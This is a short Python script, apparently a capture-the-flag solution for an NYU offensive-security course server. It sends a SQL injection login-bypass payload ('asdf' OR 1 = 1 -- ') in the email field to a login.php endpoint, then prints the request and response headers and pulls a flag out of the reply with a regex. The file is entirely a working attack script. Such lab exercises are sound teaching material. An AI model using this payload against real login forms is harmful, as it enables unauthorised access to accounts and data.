#Include the library to communicate with the world
import requests
#Extract flag from thingie
import re

#Create session to perform multiple requests
s = requests.Session()

#Set url what we're doing
baseURL = "http://offsec-chalbroker.osiris.cyber.nyu.edu:1240/"

#Gather data
cookies = {"CHALBROKER_USER_ID":"krm504"}
myData = {"email":"asdf' OR 1 = 1 -- ", "password":"asdf"}

#Send data, get responce
r = s.post(baseURL + "login.php", cookies=cookies, data=myData)

#Check if it all werked
if r.status_code == 200:
    print("200: Okay\n")
    # Gather the cookies aquired with our current cookies
    cookies.update(r.cookies.get_dict())
else:
    print("Failed")
    quit()

#See the wite
print("We sent: ", end='')
print(r.request.headers)
print()
print("They sent: ", end='')
print(r.headers)

#Check for flag
if ("flag{" in r.text):
    print("\nFlag found: ", end="")
    p = re.compile("flag\{[\S]+\}")
    print(p.findall(r.text)[0])
else:
    print("No flag found")
